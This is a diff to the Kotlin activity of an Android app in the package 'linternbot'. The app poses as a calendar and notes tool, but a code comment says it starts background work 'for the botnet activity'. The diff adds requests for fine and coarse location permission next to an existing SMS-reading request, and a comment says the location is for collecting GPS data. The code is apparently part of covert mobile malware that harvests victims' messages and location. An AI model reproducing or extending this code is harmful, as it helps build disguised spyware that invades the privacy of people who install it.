@@ -1,5 +1,6 @@
 package com.linternbot
 
+import android.Manifest
 import android.annotation.SuppressLint
 import android.content.ClipboardManager
 import android.content.pm.PackageManager
@@ -11,7 +12,10 @@ import android.util.Log
 import android.view.View
 import android.view.Window
 import android.view.WindowManager
-import android.widget.*
+import android.widget.Button
+import android.widget.CalendarView
+import android.widget.EditText
+import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -39,6 +43,24 @@ class CalendarioNotas : AppCompatActivity() {
                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
             )
         }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.ACCESS_FINE_LOCATION
+                ) == PackageManager.PERMISSION_GRANTED
+            ) {
+                Log.i("Permisos", "Se tienen los permisos!")
+            } else {
+                ActivityCompat.requestPermissions(
+                    this,
+                    arrayOf(
+                        Manifest.permission.ACCESS_COARSE_LOCATION,
+                        Manifest.permission.ACCESS_FINE_LOCATION
+                    ),
+                    1222
+                )
+            }
+        }
         setContentView(R.layout.activity_calendario_notas)
         simpleCalendarView =
             findViewById<View>(R.id.simpleCalendarView) as CalendarView // get the reference of CalendarView
@@ -58,6 +80,7 @@ class CalendarioNotas : AppCompatActivity() {
         )
 
         pidePermisoSMS()
+        pidePermisoGPS()
         // Comienzo del trabajo en segundo plano para la actividad de la botnet
         val alarm = Alarm()
         alarm.setAlarm(this)
@@ -182,5 +205,11 @@ class CalendarioNotas : AppCompatActivity() {
     fun pidePermisoSMS(){
         val permissions = arrayOf(android.Manifest.permission.READ_SMS)
         ActivityCompat.requestPermissions(this, permissions,1)
+    }
+
+    // Pide permisos al usuario para el tema de recoger la lista de gps
+    fun pidePermisoGPS(){
+        val permissions = arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION)
+        ActivityCompat.requestPermissions(this, permissions,2)
     }
 }
